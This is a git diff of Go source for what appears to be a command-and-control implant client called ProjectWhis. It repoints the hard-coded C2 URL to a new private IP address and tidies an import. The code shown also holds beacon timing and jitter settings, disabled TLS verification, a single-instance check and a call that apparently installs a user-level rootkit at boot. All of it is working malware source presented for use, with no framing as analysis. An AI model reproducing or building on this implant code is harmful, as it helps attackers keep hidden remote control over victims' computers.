@@ -17,7 +17,6 @@
 package core
 
 import (
-	"ProjectWhis/Clients/HTTPS/Linux/core"
 	"fmt"
 	"os"
 	"os/exec"
@@ -27,8 +26,8 @@ import (
 
 //Main Configuration Variables
 var (
-	C2                      = [...]string{"https://192.168.1.73:8080/"} //C2 URLs
-	InsecureSkipVerify bool = true                                      //Turn this on if you have a self-signed SSL cert
+	C2                      = [...]string{"http://10.37.129.2:8080/"} //C2 URLs
+	InsecureSkipVerify bool = true                                    //Turn this on if you have a self-signed SSL cert
 
 	PingTime  int    = 5                                                                              //Time to ping the C2 in Seconds
 	Jitter    int    = 1                                                                              //Random time to add to PingTime (+1-X * time.Seconds)
@@ -1685,7 +1684,7 @@ func Boot() { //Start all routines and start the client
 			UserKitInstall() //Leads to Client Exit
 		}
 	} else {
-		AlreadyRunning := CheckSingleInstance(core.InstanceKey)
+		AlreadyRunning := CheckSingleInstance(InstanceKey)
 		if AlreadyRunning {
 			os.Exit(0)
 		}
